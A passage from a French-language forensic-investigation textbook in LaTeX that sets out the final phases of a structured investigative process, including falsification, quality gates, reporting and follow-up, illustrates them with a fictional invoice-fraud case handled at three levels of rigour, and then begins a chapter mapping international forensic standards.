\textbf{Objectif~:} Appliquer le principe épistémologique de Popper~: tenter
activement de réfuter chaque hypothèse plutôt que de chercher uniquement des
confirmations.

\textbf{Justification méthodologique~:} Le biais de confirmation constitue l'un
des obstacles majeurs à l'objectivité investigative. La falsification active,
inspirée de la philosophie des sciences de Karl Popper \cite{popper1973},
impose la recherche délibérée d'observations qui, si découvertes, invalideraient
l'hypothèse testée. Une hypothèse ayant résisté à de multiples tentatives
sérieuses de falsification acquiert une robustesse épistémologique supérieure.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Pour chaque hypothèse post-E9~: formulation de la question~: « Quelle
          observation prouverait de manière irréfutable que cette hypothèse est
          fausse~? »~;
    \item Vérification rapide dans le corpus probatoire~;
    \item Documentation sommaire.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Pour chaque hypothèse viable, processus structuré en 4~étapes~:
          (1)~identification des observations critiques~;
          (2)~recherche active dans les preuves existantes~;
          (3)~planification de collecte additionnelle si non trouvées~;
          (4)~documentation des tentatives (succès ou échec)~;
    \item Calcul d'un indice de robustesse~: nombre de tentatives résistées.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Constitution d'une équipe \textit{Red Team} dédiée à la réfutation~;
    \item Analyse contrefactuelle~: « Si l'hypothèse était fausse,
          qu'observerait-on de différent~? »~;
    \item Formalisation logique des tests de falsification.
\end{itemize}

\textbf{Livrable~:} \textit{Rapport de Falsification} comprenant pour chaque
hypothèse testée~: conditions de falsification~; résultats~; score de robustesse~;
liste des hypothèses définitivement éliminées.

\subsection{Étape E10 --- Validation et Vérification}

\textbf{Objectif~:} Soumettre les conclusions préliminaires émergentes à un
processus rigoureux de validation multi-méthodes avant formalisation définitive.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Relecture personnelle critique du raisonnement~;
    \item Vérification arithmétique des analyses quantitatives~;
    \item Auto-évaluation des biais cognitifs potentiels.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Validation par pairs~: présentation structurée à collègues~;
    \item Test de cohérence globale~: narration complète et chronologique~;
    \item Identification et documentation des limitations méthodologiques~;
    \item Évaluation du niveau de certitude pour chaque conclusion.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Processus \textit{Red Team / Blue Team} formalisé~;
    \item Réexécution à l'aveugle par expert tiers~;
    \item Calcul d'intervalles de confiance statistiques~;
    \item Simulation d'argumentation adverse.
\end{itemize}

\textbf{Livrable~:} \textit{Rapport de Validation} comprenant~: méthodes de
validation employées~; objections identifiées et réponses~; limitations
reconnues~; niveau de consensus~; certification de validation (signatures).

\subsection{Quality Gate~3 --- Robustesse Analytique}

\textbf{Objectif~:} S'assurer que les conclusions sont suffisamment robustes,
documentées et défendables pour justifier leur formalisation.

\textbf{Critères obligatoires~:}
\begin{itemize}
    \item Génération documentée d'au moins 5~hypothèses distinctes (E8)~;
    \item Matrice de compatibilité hypothèses/preuves complétée (E9)~;
    \item Tentatives de falsification documentées pour hypothèses principales~;
    \item Application d'au moins une méthode de validation formelle (E10)~;
    \item Limitations de l'investigation clairement identifiées~;
    \item Traçabilité complète du raisonnement.
\end{itemize}

\textbf{Décision et gestion de l'itération~:}
\begin{description}
    \item[\textcolor{CouleurBordLizbiz}{\textbf{VERT}}] Progression vers Phase~4.
    \item[\textcolor{CouleurAccent}{\textbf{ORANGE}}] Expertise complémentaire
          ou re-analyse ciblée (5--10~jours).
    \item[\textcolor{CouleurBordAlerte}{\textbf{ROUGE}}] Retour selon nature~:
          lacunes testimoniales $\to$ E7~;
          incohérences analytiques $\to$ E8--E9~;
          preuves matérielles manquantes $\to$ E4--E6.
\end{description}

\begin{boiteRemarque}{Point critique sur l'itération}
Le retour en Phase~2 ou la réitération de la Phase~3 n'est pas un échec
méthodologique mais une \textbf{caractéristique normale} du processus
investigatif. Les investigations de qualité nécessitent fréquemment 2 à 3
passages dans la boucle analytique. Un taux de passage direct au QG3 de
60--70\% est satisfaisant (versus 85--90\% pour QG1 et QG2).
\end{boiteRemarque}

% ============================================================================
\section{Phase~4~: Formalisation et Transmission}
\label{sec:piu-phase4}
% ============================================================================

La phase de formalisation transforme le travail investigatif en livrables
structurés, adaptés au destinataire et juridiquement recevables.

\subsection{Étape E11 --- Documentation Exhaustive et Consolidation}

\textbf{Objectif~:} Rassembler, structurer et archiver l'intégralité des
éléments du dossier dans un format pérenne et auditable.

\textbf{Structure documentaire recommandée} --- le dossier consolidé
s'organise en cinq volumes~:
\begin{description}
    \item[\textbf{Volume~1 --- Synthèse}] Sommaire exécutif, chronologie
          factuelle, conclusions principales (10--20~pages).
    \item[\textbf{Volume~2 --- Analyses}] Méthodologie détaillée, hypothèses
          étudiées, raisonnement analytique (50--200~pages).
    \item[\textbf{Volume~3 --- Preuves}] Éléments probatoires numérotés avec
          certificats d'intégrité et chaînes de traçabilité.
    \item[\textbf{Volume~4 --- Témoignages}] Comptes rendus d'entretiens,
          déclarations écrites, expertises externes.
    \item[\textbf{Volume~5 --- Annexes}] Journal de bord, références,
          documents de travail.
\end{description}

\textbf{Livrable~:} \textit{Dossier d'Investigation Complet} structuré,
numéroté, indexé et archivé de manière pérenne.

\subsection{Étape E12 --- Rédaction du Livrable Final}

\textbf{Objectif~:} Produire un document de synthèse adapté au destinataire,
présentant de manière claire, rigoureuse et défendable les conclusions.

\subsubsection*{Structure recommandée du rapport}

\textbf{Niveau~1 --- Synthèse Exécutive (2--4~pages)~:}
\begin{enumerate}
    \item Contexte et objet de la mission~;
    \item Question(s) posée(s)~;
    \item Conclusions principales numérotées~;
    \item Niveau de confiance par conclusion (qualitatif ou quantitatif)~;
    \item Recommandations actionables immédiates~;
    \item Limitations assumées.
\end{enumerate}

\textbf{Niveau~2 --- Rapport Technique (20--100~pages)~:}
\begin{enumerate}
    \item Introduction et contexte approfondi~;
    \item Méthodologie (référencement normes/standards)~;
    \item Faits matériellement établis (chronologie détaillée)~;
    \item Hypothèses étudiées avec arbre décisionnel~;
    \item Analyse détaillée des preuves et témoignages~;
    \item Raisonnement étape par étape~;
    \item Incertitudes et limitations~;
    \item Recommandations détaillées~;
    \item Bibliographie.
\end{enumerate}

\textbf{Niveau~3 --- Dossier Probatoire (annexes)~:} Ensemble des pièces
justificatives référencées dans le rapport technique.

\subsubsection*{Principes rédactionnels fondamentaux}
\begin{description}
    \item[\textbf{Clarté}] Phrases courtes (15--20~mots maximum)~;
          vocabulaire précis~; structure logique avec transitions explicites.
    \item[\textbf{Objectivité}] Ton neutre (éviter « je pense »,
          « il est évident »)~; différenciation rigoureuse entre faits établis,
          interprétations et opinions~; limitations assumées.
    \item[\textbf{Défendabilité}] Chaque affirmation appuyée par référence
          probatoire~; raisonnement sans sauts inférentiels~;
          traçabilité complète du raisonnement.
    \item[\textbf{Adaptabilité}] Niveau de technicité ajusté selon
          destinataire~; synthèse exécutive pour décideurs non techniques.
\end{description}

\subsection{Étape E13 --- Transmission Sécurisée du Livrable}

\textbf{Objectif~:} Remettre le livrable de manière sécurisée, traçable,
conforme aux exigences de confidentialité.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Remise en main propre contre signature ou email sécurisé chiffré~;
    \item Obtention d'un accusé de réception daté~;
    \item Conservation de la preuve de transmission.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Transmission sécurisée~: chiffrement bout-en-bout (GPG, S/MIME)~;
    \item Bordereau de transmission détaillé et signé~;
    \item Liste exhaustive des documents transmis.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Remise en présence de témoins (huissier si contexte critique)~;
    \item Signature électronique qualifiée~;
    \item Horodatage blockchain pour preuve d'antériorité immuable~;
    \item Watermarking individualisé par destinataire.
\end{itemize}

\textbf{Livrable~:} \textit{Preuve de Transmission} comprenant bordereau signé,
liste exhaustive des documents, modalités de transmission, accusé contresigné.

% ============================================================================
\section{Phase~5~: Suivi Post-Transmission}
\label{sec:piu-phase5}
% ============================================================================

Cette phase, optionnelle pour investigations simples sans contentieux, devient
essentielle dans les contextes judiciaires ou lorsque des contestations sont
anticipées.

\subsection{Étape E14 --- Préparation à la Défense Contradictoire}

\textbf{Objectif~:} Anticiper les contestations possibles et préparer une défense
rigoureuse et documentée des conclusions.

\textbf{Actions~:} Constitution d'un dossier de défense comprenant~: analyse
des vulnérabilités du rapport~; arguments adverses anticipés avec contre-arguments~;
synthèses aide-mémoire par thème~; simulations d'interrogatoires contradictoires~;
références scientifiques ou jurisprudentielles de soutien.

\subsection{Étape E15 --- Maintenance Probatoire Continue}

\textbf{Objectif~:} Préserver intégrité et accessibilité du dossier durant toute
la procédure contentieuse ou administrative.

\textbf{Actions~:} Surveillance active (tests d'intégrité mensuels)~;
gestion rigoureuse des accès avec journal exhaustif~;
mise à jour de la chaîne de traçabilité~;
réponse aux demandes de clarification~;
correction d'erreurs matérielles avec versioning strict.

\subsection{Étape E16 --- Analyse des Contre-Expertises}

\textbf{Objectif~:} Évaluer les rapports contradictoires produits par la partie
adverse et préparer une réfutation méthodique.

\textbf{Actions~:} Analyse méthodologique critique~;
identification des erreurs factuelles~;
discussion des divergences interprétatives légitimes~;
rédaction d'un mémoire en réponse structuré~;
proposition d'expertises complémentaires si nécessaire.

\subsection{Étape E17 --- Clôture et Retour d'Expérience}

\textbf{Objectif~:} Archiver définitivement le dossier, capitaliser les
apprentissages et améliorer les processus futurs.

\textbf{Actions~:} Débriefing structuré d'équipe~;
rédaction d'un rapport de retour d'expérience (REX)~;
archivage définitif conforme aux durées légales~;
destruction sécurisée des données temporaires~;
intégration des enseignements dans la base de connaissances~;
mise à jour des procédures standard.

\begin{boiteRemarque}{E17 n'est pas optionnelle}
L'étape~E17 (\textit{Retour d'Expérience}) n'est pas optionnelle~: elle
constitue le mécanisme d'amélioration continue permettant l'évolution et
l'adaptation du processus aux nouveaux défis investigatifs. Une organisation
qui ne fait pas de REX après chaque investigation majeure est condamnée à
répéter les mêmes erreurs.
\end{boiteRemarque}

% ============================================================================
\section{Cas Pratique~: L'Affaire de la Facture Suspecte}
\label{sec:piu-rousseau}
% ============================================================================

\subsection{Contexte général}

Le 15~mars~2025, Madame Claire ROUSSEAU, dirigeante de la société INNOV-TECH
SARL (PME de 25~salariés), constate un débit de 47~850~\texteuro{} sur son relevé
bancaire au profit de la société CONSULTING-PRO, dont elle n'a aucune
connaissance. En vérifiant ses archives comptables, elle découvre une facture
n°~CP-2025-089 datée du 28~février~2025, pour des « prestations de conseil
stratégique »~: prestations qu'elle affirme n'avoir jamais commandées.

Cette investigation illustre comment le PIU s'applique différemment selon trois
contextes~:
\begin{enumerate}
    \item \textbf{Contexte particulier}~: Madame ROUSSEAU mène elle-même
          l'investigation~;
    \item \textbf{Contexte entreprise}~: INNOV-TECH mandate un audit interne~;
    \item \textbf{Contexte judiciaire}~: un expert est désigné par le tribunal.
\end{enumerate}

\subsection{Application~: Contexte particulier (niveau minimal/standard)}

\textbf{Phase~1~: Initialisation}

\textbf{E1~-- Réception et Évaluation~:} Enjeu financier~: 47~850 (significatif)~;
complexité~: moyenne~; faisabilité~: 10h/semaine disponibles~;
risque~: fraude interne ou externe. Décision~: investigation personnelle
préliminaire avant éventuel dépôt de plainte.

\textbf{E2~-- Décision d'Engagement~:} Niveau minimal~: décision seule.
Périmètre~: identifier l'origine de la facture et le responsable du paiement.
Délai~: 3~semaines. Budget~: temps personnel + consultation avocat (2h).
Pas de mandat formel, mais décision documentée dans un email à elle-même
(traçabilité).

\textbf{E3~-- Planification~:}
\begin{enumerate}
    \item Rassembler tous documents (facture, relevés, contrats,
          correspondances)~;
    \item Interroger ses employés (comptable, assistante administrative)~;
    \item Rechercher informations sur CONSULTING-PRO (KBIS, site web)~;
    \item Consulter avocat pour aspects juridiques.
\end{enumerate}
\textbf{QG1~:} Auto-évaluation VERT. Progression Phase~2.

\textbf{Phase~2~: Acquisition}

\textbf{E4~-- Collecte~:} Niveau standard~: facture CP-2025-089 (scan haute
résolution, horodaté)~; relevé bancaire~; extrait KBIS de CONSULTING-PRO~;
tous emails mentionnant « CONSULTING-PRO »~; registre courrier (pas de
mention)~; contrats 2024--2025 (aucun avec CONSULTING-PRO). Numérotation~:
EP001 à EP008.

\textbf{E5~-- Sécurisation~:} 3~copies~: disque dur externe chiffré (BitLocker),
cloud personnel sécurisé (ProtonDrive), copie papier en coffre. Hash SHA-256
calculé et conservé séparément pour chaque fichier numérique. Règle~: jamais
travailler sur originaux papier.

\textbf{E6~-- Parties Prenantes~:} Sophie LEMOINE (comptable, a enregistré
la facture)~; Julie MARTIN (assistante administrative)~; Marc DUBOIS (gérant
CONSULTING-PRO selon KBIS)~; Me Paul BERNARD (avocat conseil).

\textbf{QG2~:} 8~éléments numérotés~; 3~copies~; hash calculés~; journal
d'accès manuscrit. VERT. Progression Phase~3.

\textbf{Phase~3~: Investigation}

\textbf{E7~-- Interrogatoires~:} Sophie LEMOINE (12~mars, 14h)~: déclare avoir
reçu la facture par email le 1er~mars~; semblait régulière, tamponnée
« bon à payer »~; ne connaît pas CONSULTING-PRO~; fournit l'email de réception
(\texttt{contact@consulting-pro.fr}). Julie MARTIN (13~mars)~: aucune trace.
Comptes rendus signés.

\textbf{E8~-- Hypothèses~:}
\begin{itemize}
    \item \textbf{H1}~: Erreur administrative --- facture légitime oubliée~;
    \item \textbf{H2}~: Fraude externe --- CONSULTING-PRO frauduleuse~;
    \item \textbf{H3}~: Complicité interne --- Sophie complice~;
    \item \textbf{H4}~: Usurpation d'identité entreprise~;
    \item \textbf{H5}~: Erreur de destinataire (facture destinée à homonyme).
\end{itemize}

\textbf{E9~-- Confrontation~:} H1 réfutée (gestion rigoureuse, aucun contrat)~;
H2 cohérente (KBIS~: création 15~janvier~2025, très récent, suspect)~;
H3 peu cohérente (Sophie sincère, 5~ans ancienneté, pas d'indice financier)~;
H4 possible mais sans preuve~; H5 réfutée (facture mentionne INNOV-TECH
avec SIRET correct). Score~: H2 dominant.

\textbf{E9bis~-- Falsification~:} Pour H2~: si prestation réellement effectuée,
il devrait exister~: contrat signé, correspondances préalables, livrables.
Recherche approfondie~: rien trouvé. H2 renforcée.

\textbf{E10~-- Validation~:} Consultation de Me BERNARD (avocat)~: confirme
indices sérieux de fraude~; recommande dépôt de plainte.

\textbf{QG3~:} 5~hypothèses générées~; matrice complétée~; falsification
effectuée~; validation externe (avocat). VERT.

\textbf{Phase~4~: Formalisation}

\textbf{E11--E12~-- Rapport~:} Dossier simple (15~pages)~: synthèse
(facture suspecte, aucune prestation commandée, indices de fraude externe)~;
chronologie~; copies EP001--EP008~; comptes rendus d'entretiens~;
conclusion~: fraude externe présumée (H2). Transmission~: avocat (chiffré)
+ commissariat (copie papier).

\textbf{Phase~5~:} Maintien du dossier pour enquête policière éventuelle.
Documentation de toutes les suites.

\subsection{Application~: Contexte entreprise (niveau avancé)}

Le 16~mars, Madame ROUSSEAU alerte son conseil d'administration. Décision
collégiale~: audit interne approfondi. Mandat formel signé par le Président
du CA. Équipe~: Jean DUPUIS (Dir.~Financier, lead)~+ Marie LECLERC (DRH)
+ Me Sophie MOREAU (Avocate). Budget~: 15~000. Délai~: 6~semaines.

\textbf{Phase~2~-- Niveau avancé~:} Image forensique du serveur de messagerie
(période janvier--mars~2025)~; extraction logs accès ERP comptable~;
OSINT sur CONSULTING-PRO (révèle antécédents judiciaires de Marc DUBOIS~:
escroquerie 2019)~; présence huissier pour constat de l'email suspect~;
hash SHA-512 sur toutes images forensiques~; blockchain privée pour
horodatage immuable.

\textbf{Phase~3~-- Niveau avancé~:} Expertise IT sur l'email révèle~: spoofing
(falsification de l'adresse expéditeur)~; headers techniques montrent origine
depuis serveur russe~; PDF de la facture créé avec logiciel de retouche.
Processus ACH formalisé~: 7~hypothèses, matrice quantitative bayésienne,
tests de falsification systématiques. Conclusion~: H2 confirmée avec
probabilité~$> 95\%$. Red Team interne~: consensus 100\%.

\textbf{Phase~4~:} Rapport 85~pages en 3~volumes~; présentation orale au
CA~; archivage légal 10~ans.

\subsection{Application~: Contexte judiciaire (niveau avancé systématique)}

Le 1er~avril~2025, le juge d'instruction désigne Madame Isabelle FONTAINE,
expert judiciaire, pour répondre à deux questions~: (1)~la facture correspond-elle
à une prestation réelle~? (2)~quelle est son origine~?

\textbf{Phase~1~:} Vérification d'absence de conflit d'intérêt~; serment prêté.
Mandat conforme~: ordonnance~; méthodologie~: \norme{ISO~27037} pour forensique,
principes CNCEJ pour expertise judiciaire~; délai~: 4~mois.

\textbf{Phase~2~:} Collecte contradictoire en présence des parties, avec
greffier. Saisie contradictoire du serveur messagerie INNOV-TECH (15~avril)~;
convocation de Marc DUBOIS (22~avril)~: refuse de produire tout document~;
scellés judiciaires~; hash SHA-512 certifié par l'expert.

\textbf{Phase~3~:} ACH formalisée avec documentation exhaustive~;
conclusion~: H2 (fraude externe par phishing/spoofing) probabilité~$> 98\%$~;
peer review par confrère expert.

\textbf{Phase~4~:} Rapport d'expertise judiciaire (65~pages, normes CNCEJ)~:
réponses aux questions du juge~:}
\begin{itemize}
    \item \textit{Q1 -- La facture correspond-elle à une prestation réelle~?}
          \textbf{R~: Non. Aucun élément probatoire ne démontre qu'une
          prestation ait été effectuée.}
    \item \textit{Q2 -- Origine de la facture~?}
          \textbf{R~: Émission frauduleuse par CONSULTING-PRO via
          techniques de phishing/spoofing.}
\end{itemize}
Dépôt au greffe le 25~juillet~; archivage 30~ans.

\textbf{Phase~5~:} Contre-expertise privée de CONSULTING-PRO (prétend prestation
orale)~: réfutée par l'expert (une prestation de 47k ne peut être exclusivement
orale). Condamnation pénale de Marc DUBOIS (escroquerie).

\subsection{Synthèse comparative des trois contextes}

\begin{tableaucours}{p{2.8cm}p{3.2cm}p{3.2cm}p{3.2cm}}{%
    \tableauHeader{Dimension} &
    \tableauHeader{Particulier} &
    \tableauHeader{Entreprise} &
    \tableauHeader{Judiciaire}
}
Niveau rigueur & Minimal/Standard & Standard/Avancé & Avancé systématique \\
Durée & 3~semaines & 6~semaines & 4~mois \\
Ressources & 1~personne + avocat (2h) & Équipe~3 + outils forensiques &
    Expert + consultant IT \\
Coût estimé & 500~(avocat) & 15~000 & 8~000~(honoraires) \\
Validation & Avocat & Red Team interne & Peer review + juge \\
Livrable & Dossier 15p + plainte & Rapport 85p (3~vol.) &
    Rapport expertise 65p (CNCEJ) \\
Force probante & Moyenne & Élevée (interne) & Maximale (judiciaire) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~6.1 --- Comparaison des trois applications
contextuelles du PIU}\end{center}

% ============================================================================
\section{Recommandations d'Usage et Domaines d'Application}
\label{sec:piu-recommandations}
% ============================================================================

\subsection{Principe fondamental}

La qualité d'une investigation se mesure moins à la rapidité avec laquelle on
parvient à des conclusions qu'à la robustesse avec laquelle ces conclusions
résistent à la contestation contradictoire. Le PIU, par sa structure formelle
intégrant falsification active, validation multi-méthodes et Quality Gates,
vise cet objectif de défendabilité maximale.

\subsection{Sélection du niveau de rigueur}

Le praticien doit calibrer le niveau de rigueur selon la matrice de criticité
(Tableau~\ref{tab:piu-criticite}). Une investigation à enjeu limité ne justifie
pas systématiquement un niveau avancé (coût/bénéfice)~; une investigation à
enjeu critique (pénal, financier majeur) ne peut se satisfaire d'un niveau
minimal sans risquer l'invalidation ultérieure.

\subsection{Domaines d'application}

Bien que ce cours illustre le PIU dans un contexte de forensique numérique,
la méthodologie s'applique à tout domaine investigatif~:
\begin{itemize}
    \item Investigations RH (harcèlement, discrimination)~;
    \item Forensique numérique (cybercriminalité, fuites de données)~;
    \item Investigations techniques (accidents, défaillances)~;
    \item Investigations scientifiques (fraude académique)~;
    \item Investigations journalistiques~;
    \item Audits de conformité réglementaire.
\end{itemize}

\subsection{Documentation comme investissement}

L'effort documentaire demandé à chaque étape (inventaires, matrices, journaux)
peut sembler lourd mais constitue un \textbf{investissement essentiel}.
En cas de contestation (Phase~5), la qualité de la documentation initiale
détermine directement la capacité à défendre les conclusions, parfois plusieurs
années après les faits.

\begin{boxCRO}
\textbf{Analyse CRO --- Le PIU dans son ensemble}

Le PIU est conçu pour maximiser $\mathcal{O}$ (opposabilité) tout en
maintenant $\mathcal{R}$ (fiabilité) et en gérant $\mathcal{C}$ (confidentialité).

Les Quality Gates sont les mécanismes d'assurance qualité qui garantissent
que $\mathcal{R}$ et $\mathcal{O}$ ne sont pas compromises par la pression
temporelle ou le biais de confirmation. La falsification active (E9bis) est
le dispositif épistémologique qui protège $\mathcal{R}$ contre les biais.

La confidentialité ($\mathcal{C}$) est gérée par les niveaux de rigueur~:
le niveau avancé (contexte judiciaire) exige une protection maximale des
données sensibles~; le niveau minimal (contexte particulier) accepte
davantage de compromis proportionnels à l'enjeu.

\cro{$\sim$ gérée par niveau}{$\uparrow\uparrow$ maximisée}{$\uparrow\uparrow$ objectif principal}
\end{boxCRO}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item Le \textbf{PIU} est un processus modulaire en \textbf{5~phases,
          17~étapes et 3~Quality Gates}~: Initialisation (E1--E3) $\to$
          Acquisition (E4--E6) $\to$ Investigation (E7--E10) $\to$
          Formalisation (E11--E13) $\to$ Suivi (E14--E17).

    \item La \textbf{matrice de criticité} calibre le niveau de rigueur (minimal
          / standard / avancé) selon l'enjeu financier, pénal, technique,
          le nombre de parties et la durée.

    \item Les \textbf{Quality Gates} (QG1~: pré-opérationnel~;
          QG2~: intégrité probatoire~; QG3~: robustesse analytique) sont
          des points de contrôle obligatoires à trois niveaux~:
          VERT (progression)~/ ORANGE (conditionnel)~/ ROUGE (suspension).

    \item La \textbf{boucle itérative} entre Phase~2 et Phase~3 est normale~:
          2 à 3 passages est satisfaisant~; un passage direct suggère un
          manque d'approfondissement.

    \item La \textbf{falsification active} (E9bis) -- principe poppérien --
          est la protection contre le biais de confirmation. Chercher à
          réfuter ses hypothèses, pas à les confirmer.

    \item L'\textbf{affaire ROUSSEAU} illustre que le \emph{même} fait
          (fraude externe H2 à 47~850) est atteint par trois niveaux de
          rigueur, mais avec une force probante radicalement différente~:
          suffisante pour une plainte, élevée pour une décision interne,
          maximale pour une condamnation pénale.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~6.1 --- Matrice de criticité \niveaubase}]
Pour chacune des investigations suivantes, déterminez le niveau de rigueur
approprié (minimal / standard / avancé) en justifiant votre réponse par
la matrice de criticité~:
\begin{enumerate}[(a)]
    \item Soupçon de fraude interne de 450~000~FCFA dans une administration
          publique camerounaise~; suspect unique~; durée estimée~: 2~mois.
    \item Recherche de documents compromettants sur le PC d'un employé
          licencié pour harcèlement moral~; aucune plainte déposée~;
          enjeu~: décision de licenciement interne.
    \item Investigation mandatée par le procureur sur une attaque ransomware
          ayant paralysé un hôpital pendant 72h~; données patients exposées~;
          plusieurs suspects identifiés dans 3~pays.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~6.2 --- Application du PIU \niveaumoyen}]
Vous êtes mandaté par la direction de TRANSBOIS~SA (affaire MVOM,
Chapitre~\ref{chap:gr-affaires}) pour conduire l'investigation interne
sur l'attaque ransomware. Appliquez les étapes E1 à E6~:
\begin{enumerate}[(a)]
    \item Rédigez la \textit{Fiche d'Évaluation Initiale} (E1)~: enjeux,
          risques, faisabilité.
    \item Définissez le périmètre d'investigation (E2) et justifiez le niveau
          de rigueur choisi.
    \item Listez les 8~premières sources à collecter (E4) en les classant
          par ordre de volatilité~; précisez la méthode de collecte pour
          chacune.
    \item Quels critères QG2 risquent d'être difficiles à satisfaire dans
          ce contexte~? Proposez comment les atteindre.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~6.3 --- Falsification active \niveauexpert}]
Dans l'investigation ROUSSEAU (contexte entreprise), l'hypothèse H2
(fraude externe par phishing/spoofing) a été retenue avec une probabilité
$> 95\%$.

\begin{enumerate}[(a)]
    \item Identifiez 4~observations critiques qui, si trouvées, auraient
          définitivement réfuté H2 (conditions de falsification).
    \item Comment calculer l'indice de robustesse de H2~? Quel score
          attribuez-vous à cette hypothèse~?
    \item Formulez l'analyse CRO de la décision d'inclure dans le rapport
          l'analyse forensique des en-têtes email (révèle l'origine depuis
          un serveur russe, potentiellement sensible géopolitiquement).
    \item Dans quel cas aurait-il fallu activer le niveau ROUGE au QG3~?
          Quelles étapes de retour auraient été nécessaires~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Bibliographie recommandée pour ce chapitre~:}
\begin{itemize}
    \item \norme{ISO/IEC~27037:2012}~: Guidelines for identification,
          collection, acquisition and preservation of digital evidence.
    \item \norme{NIST SP~800-86}~: Guide to Integrating Forensic Techniques
          into Incident Response, 2006.
    \item Heuer, R.~J.,
          \textit{Psychology of Intelligence Analysis},
          CIA, 1999 (méthode ACH). \cite{heuer1999}
    \item Popper, K., \textit{La logique de la découverte scientifique},
          Payot, 1973. \cite{popper1973}
    \item ACPO, \textit{Good Practice Guide for Digital Evidence}, 2012.
\end{itemize}
\textbf{Transition.} Le Chapitre~\ref{chap:meth-std} compare le PIU aux
standards internationaux (SANS FOR508, NIST, DFRWS, ACPO) pour en
montrer la cohérence et les spécificités. Les Chapitres~\ref{chap:custody}
et~\ref{chap:acq} approfondissent respectivement la chaîne de custody
et les outils d'acquisition --- deux dimensions essentielles de la Phase~2.
\end{boxinfo}
      
        % ============================================================================
% Fichier  : partie2/P02_C07_methodologies_standards.tex
% Titre    : Méthodologies et Standards Internationaux
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : 7_methodologies_investigation.tex, 5_cadre_normatif_global.tex,
%            M4_Cadre_Normatif_International_PNC.docx, processus_investigatif_universel.pdf
% ============================================================================

\chapter{Méthodologies et Standards Internationaux}
\label{chap:meth-std}

\epigraph{%
    « Digital forensics is not just about recovering data, it's about
    understanding the context in which the data existed. »%
}{--- Joshua I. James}

\niveauChapitre{Fondamental}{%
    Lecture du Chapitre~\ref{chap:PIU} (PIU) recommandée~: ce chapitre
    positionne les standards internationaux par rapport au PIU et démontre
    leur cohérence.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser les cinq standards forensiques mondiaux de référence~:
          DFRWS, ISO/IEC~27037/41/42/43, NIST~SP~800-86, RFC~3227, ACPO.
    \item Comprendre la logique des standards~: pourquoi ils existent,
          ce qu'ils imposent, et ce qu'ils laissent libre.
    \item Mettre en correspondance chaque standard avec les phases du PIU
          pour montrer leur cohérence structurelle.
    \item Appliquer le framework d'analyse \termecle{DICES} pour comparer
          les méthodologies mondiales.
    \item Identifier les équivalences entre standards internationaux et
          droit camerounais (\loicam{2010/012}, \loicam{2024/017}).
    \item Choisir le standard adapté à une investigation selon son contexte.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Standards et PIU~: une relation de complémentarité}
% ============================================================================

Le Processus Investigatif Universel (PIU) présenté au Chapitre~\ref{chap:PIU}
est un cadre général adaptatif. Les standards internationaux qui font l'objet
de ce chapitre sont ses fondements normatifs~: ils précisent \emph{comment}
chaque phase doit être conduite pour être reconnue par les juridictions et
institutions du monde entier. La relation n'est pas de concurrence mais de
complémentarité~: le PIU structure, les standards légitiment.

\separateur

% ============================================================================
\section{Architecture des Standards Forensiques~: vue d'ensemble}
\label{sec:std-architecture}
% ============================================================================

\subsection{Pourquoi des standards~?}

Sans standards communs, deux investigateurs de deux pays différents peuvent
analyser la même preuve avec des méthodes incompatibles et produire des
conclusions qui se contredisent sans qu'aucune expertise externe ne puisse
trancher. Les standards résolvent trois problèmes fondamentaux~:
\begin{enumerate}
    \item \textbf{Interopérabilité}~: les preuves collectées selon ISO~27037
          au Cameroun sont recevables dans un tribunal belge ou canadien~;
    \item \textbf{Opposabilité}~: un expert qui documente sa conformité à
          NIST~SP~800-86 peut répondre à n'importe quelle attaque méthodologique~;
    \item \textbf{Formation}~: les standards constituent une base d'apprentissage
          commune pour les investigateurs du monde entier.
\end{enumerate}

\subsection{Cartographie des standards}

\begin{tableaucours}{p{3.0cm}p{2.5cm}p{2.5cm}p{4.0cm}}{%
    \tableauHeader{Standard} &
    \tableauHeader{Organisme} &
    \tableauHeader{Domaine} &
    \tableauHeader{Contribution principale}
}
DFRWS 2001 & DFRWS & Processus global &
    Premier modèle formel~: 6~phases \\
\norme{ISO/IEC 27037} & ISO/IEC & Collecte & Rôles DEFR/DES,
    identification et acquisition \\
\norme{ISO/IEC 27041} & ISO/IEC & Méthodes &
    Validation des méthodes d'investigation \\
\norme{ISO/IEC 27042} & ISO/IEC & Analyse &
    Analyse et interprétation des preuves \\
\norme{ISO/IEC 27043} & ISO/IEC & Processus complet &
    Principes et processus intégrés \\
\norme{NIST SP 800-86} & NIST (USA) & IR + Forensique &
    Intégration réponse aux incidents \\
\norme{RFC 3227} & IETF & Volatilité &
    Ordre de collecte, bonnes pratiques \\
ACPO Guide & ACPO (UK) & Déontologie &
    4~principes, responsabilité légale \\
SANS FOR508 & SANS Institute & IR avancée &
    Forensique entreprise, threat hunting \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~7.1 --- Cartographie des standards forensiques}
\end{center}

\subsection{Correspondance standards / phases PIU}

\begin{tableaucours}{p{4.2cm}p{2.0cm}p{2.0cm}p{2.0cm}p{2.0cm}}{%
    \tableauHeader{Standard} &
    \tableauHeader{Ph.1\\Init.} &
    \tableauHeader{Ph.2\\Acquis.} &
